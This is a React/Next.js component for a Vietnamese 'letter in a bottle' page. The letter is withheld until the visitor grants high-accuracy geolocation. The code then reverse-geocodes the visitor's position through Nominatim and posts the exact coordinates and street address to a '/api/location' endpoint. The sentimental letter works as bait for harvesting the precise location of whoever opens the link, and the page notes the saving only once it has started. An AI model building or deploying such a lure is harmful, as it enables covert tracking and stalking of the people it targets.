"use client";

import { useState, useEffect, useRef } from "react";
import styles from "./BottleScene.module.css";

type SceneState =
  | "idle"
  | "requesting"
  | "flowing"
  | "arrived"
  | "opening"
  | "open"
  | "denied";

const LETTER_CONTENT = `Gửi người đang đọc thư này,

Nếu bạn nhìn thấy những dòng chữ này, 
điều đó có nghĩa là lá thư đã tìm được đến tay bạn.

Dòng sông cuộc đời đưa chúng ta đến những nơi 
ta chưa từng nghĩ tới. Và đôi khi, 
chính những khoảnh khắc ngẫu nhiên ấy 
lại trở thành những ký ức đẹp nhất.

Hãy trân trọng từng khoảnh khắc bạn đang sống. 
Hãy yêu thương những người xung quanh bạn. 
Và đừng quên rằng, ở đâu đó trên thế giới này, 
có người đang gửi đến bạn những điều tốt đẹp nhất.

Với tất cả yêu thương,
Người gửi lá thư 🌊`;

export default function BottleScene() {
  const [sceneState, setSceneState] = useState<SceneState>("idle");
  const [bottlePos, setBottlePos] = useState(0); // 0 = left, 100 = right
  const [stars, setStars] = useState<{ x: number; y: number; size: number; opacity: number }[]>([]);
  const [locationData, setLocationData] = useState<{
    latitude: number;
    longitude: number;
    address?: string;
  } | null>(null);
  const [saveStatus, setSaveStatus] = useState<"idle" | "saving" | "saved" | "error">("idle");
  const animFrameRef = useRef<number | null>(null);
  const startTimeRef = useRef<number | null>(null);

  useEffect(() => {
    const newStars = Array.from({ length: 80 }, () => ({
      x: Math.random() * 100,
      y: Math.random() * 45,
      size: Math.random() * 2 + 0.5,
      opacity: Math.random() * 0.7 + 0.3,
    }));
    setStars(newStars);
  }, []);

  const animateBottle = () => {
    const DURATION = 4000;
    if (!startTimeRef.current) startTimeRef.current = performance.now();

    const elapsed = performance.now() - startTimeRef.current;
    const progress = Math.min(elapsed / DURATION, 1);
    // Ease in-out cubic
    const eased =
      progress < 0.5
        ? 4 * progress * progress * progress
        : 1 - Math.pow(-2 * progress + 2, 3) / 2;

    setBottlePos(eased * 100);

    if (progress < 1) {
      animFrameRef.current = requestAnimationFrame(animateBottle);
    } else {
      setSceneState("arrived");
      setTimeout(() => {
        setSceneState("opening");
        setTimeout(() => setSceneState("open"), 1500);
      }, 600);
    }
  };

  const saveLocation = async (lat: number, lng: number) => {
    setSaveStatus("saving");
    try {
      // Reverse geocode using nominatim
      let address = `${lat.toFixed(4)}, ${lng.toFixed(4)}`;
      try {
        const geoRes = await fetch(
          `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`
        );
        const geoData = await geoRes.json();
        if (geoData.display_name) {
          address = geoData.display_name;
        }
      } catch {
        // ignore reverse geocode errors
      }

      setLocationData({ latitude: lat, longitude: lng, address });

      const res = await fetch("/api/location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          latitude: lat,
          longitude: lng,
          address,
          content: `📍 Vị trí: ${address} | Tọa độ: ${lat.toFixed(6)}, ${lng.toFixed(6)}`,
        }),
      });

      if (res.ok) {
        setSaveStatus("saved");
      } else {
        setSaveStatus("error");
      }
    } catch {
      setSaveStatus("error");
    }
  };

  const handleEnableLocation = () => {
    setSceneState("requesting");

    if (!navigator.geolocation) {
      setSceneState("denied");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        saveLocation(latitude, longitude);
        setSceneState("flowing");
        startTimeRef.current = null;
        requestAnimationFrame(animateBottle);
      },
      () => {
        setSceneState("denied");
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  };

  return (
    <div className={styles.scene}>
      {/* Stars */}
      <div className={styles.sky}>
        {stars.map((star, i) => (
          <div
            key={i}
            className={styles.star}
            style={{
              left: `${star.x}%`,
              top: `${star.y}%`,
              width: `${star.size}px`,
              height: `${star.size}px`,
              opacity: star.opacity,
              animationDelay: `${Math.random() * 3}s`,
            }}
          />
        ))}
        {/* Moon */}
        <div className={styles.moon} />
        {/* Moon reflection */}
        <div className={styles.moonReflection} />
      </div>

      {/* River */}
      <div className={styles.riverContainer}>
        {/* Waves */}
        <div className={styles.waves}>
          <div className={`${styles.wave} ${styles.wave1}`} />
          <div className={`${styles.wave} ${styles.wave2}`} />
          <div className={`${styles.wave} ${styles.wave3}`} />
        </div>

        {/* Bottle */}
        <div
          className={`${styles.bottle} ${sceneState === "flowing" ? styles.bottleFlowing : ""} ${sceneState === "arrived" || sceneState === "opening" || sceneState === "open" ? styles.bottleArrived : ""}`}
          style={{
            left: `calc(5% + ${bottlePos * 0.88}%)`,
          }}
        >
          <svg
            viewBox="0 0 60 120"
            width="60"
            height="120"
            className={styles.bottleSvg}
          >
            {/* Bottle body */}
            <defs>
              <linearGradient id="bottleGrad" x1="0%" y1="0%" x2="100%" y2="0%">
                <stop offset="0%" stopColor="#4fc3f7" stopOpacity="0.6" />
                <stop offset="40%" stopColor="#81d4fa" stopOpacity="0.8" />
                <stop offset="100%" stopColor="#29b6f6" stopOpacity="0.5" />
              </linearGradient>
              <linearGradient id="liquidGrad" x1="0%" y1="0%" x2="0%" y2="100%">
                <stop offset="0%" stopColor="#0d47a1" stopOpacity="0.4" />
                <stop offset="100%" stopColor="#1565c0" stopOpacity="0.6" />
              </linearGradient>
              <linearGradient id="corkGrad" x1="0%" y1="0%" x2="0%" y2="100%">
                <stop offset="0%" stopColor="#d4a373" />
                <stop offset="100%" stopColor="#8b6914" />
              </linearGradient>
            </defs>
            {/* Bottle neck */}
            <rect x="22" y="10" width="16" height="18" rx="4" fill="url(#bottleGrad)" stroke="#81d4fa" strokeWidth="1" />
            {/* Bottle body */}
            <path d="M10 28 Q8 35 8 55 L8 95 Q8 108 30 108 Q52 108 52 95 L52 55 Q52 35 50 28 Z"
              fill="url(#bottleGrad)" stroke="#81d4fa" strokeWidth="1" />
            {/* Liquid inside */}
            <path d="M11 60 Q11 58 30 58 Q49 58 49 60 L49 95 Q49 105 30 105 Q11 105 11 95 Z"
              fill="url(#liquidGrad)" />
            {/* Letter hint inside */}
            <rect x="18" y="65" width="24" height="18" rx="2" fill="#fdf6e3" opacity="0.7" />
            <line x1="21" y1="70" x2="39" y2="70" stroke="#a0876a" strokeWidth="1.5" opacity="0.7" />
            <line x1="21" y1="74" x2="39" y2="74" stroke="#a0876a" strokeWidth="1.5" opacity="0.7" />
            <line x1="21" y1="78" x2="33" y2="78" stroke="#a0876a" strokeWidth="1.5" opacity="0.7" />
            {/* Shine */}
            <path d="M16 35 Q14 50 14 70" stroke="white" strokeWidth="2" strokeLinecap="round" opacity="0.4" />
            {/* Cork */}
            <rect
              x="19"
              y="4"
              width="22"
              height="10"
              rx="3"
              fill="url(#corkGrad)"
              className={sceneState === "opening" || sceneState === "open" ? styles.corkOpen : ""}
            />
          </svg>
        </div>

        {/* Left bank */}
        <div className={styles.bankLeft} />
        {/* Right bank */}
        <div className={styles.bankRight} />
      </div>

      {/* Letter overlay */}
      {sceneState === "open" && (
        <div className={styles.letterOverlay}>
          <div className={styles.letterContainer}>
            <div className={styles.letterPaper}>
              <div className={styles.letterWax}>🔴</div>
              <h2 className={styles.letterTitle}>✉️ Lá Thư Từ Dòng Sông</h2>
              <div className={styles.letterDivider} />
              <pre className={styles.letterContent}>{LETTER_CONTENT}</pre>
              {locationData && (
                <div className={styles.locationBadge}>
                  <span>📍</span>
                  <span className={styles.locationText}>
                    {saveStatus === "saving" && "Đang lưu vị trí của bạn..."}
                    {saveStatus === "saved" && `Vị trí đã được ghi nhận`}
                    {saveStatus === "error" && "Không thể lưu vị trí"}
                  </span>
                </div>
              )}
              <div className={styles.letterFooter}>
                <span>🌊 Được gửi từ dòng sông thời gian</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* UI Overlay */}
      <div className={styles.uiOverlay}>
        {/* Title */}
        {(sceneState === "idle" || sceneState === "requesting") && (
          <div className={styles.titleSection}>
            <h1 className={styles.mainTitle}>
              🍾 Lá Thư Chờ Định Vị
            </h1>
            <p className={styles.subtitle}>
              {sceneState === "idle"
                ? "Lá thư đang chờ bạn bật định vị."
                : "Đang xin quyền truy cập vị trí..."}
            </p>
            {sceneState === "idle" && (
              <button
                id="enable-location-btn"
                className={styles.enableBtn}
                onClick={handleEnableLocation}
              >
                <span className={styles.btnIcon}>📍</span>
                Bật định vị
              </button>
            )}
            {sceneState === "requesting" && (
              <div className={styles.requesting}>
                <div className={styles.spinner} />
                <span>Đang chờ xác nhận...</span>
              </div>
            )}
          </div>
        )}

        {/* Flowing hint */}
        {sceneState === "flowing" && (
          <div className={styles.flowingHint}>
            <p>🌊 Chiếc chai đang trôi đến bạn...</p>
          </div>
        )}

        {/* Arrived */}
        {sceneState === "arrived" && (
          <div className={styles.flowingHint}>
            <p>🍾 Chiếc chai đã đến nơi!</p>
          </div>
        )}

        {/* Opening */}
        {sceneState === "opening" && (
          <div className={styles.flowingHint}>
            <p>✨ Đang mở lá thư...</p>
          </div>
        )}

        {/* Denied */}
        {sceneState === "denied" && (
          <div className={styles.deniedCard}>
            <div className={styles.deniedIcon}>🔒</div>
            <h2 className={styles.deniedTitle}>Bạn đã chặn quyền truy cập vị trí</h2>
            <p className={styles.deniedText}>
              Chiếc chai vẫn đứng yên... Lá thư chưa thể đến tay bạn.
            </p>
            <div className={styles.instructions}>
              <h3>Cách bật lại trong Chrome:</h3>
              <ol>
                <li>Nhấn vào biểu tượng 🔒 trên thanh địa chỉ</li>
                <li>Chọn <strong>Site settings</strong></li>
                <li>Tìm <strong>Location</strong> → chọn <strong>Allow</strong></li>
                <li>Tải lại trang và thử lại</li>
              </ol>
            </div>
            <button
              id="retry-btn"
              className={styles.retryBtn}
              onClick={() => window.location.reload()}
            >
              🔄 Thử lại
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
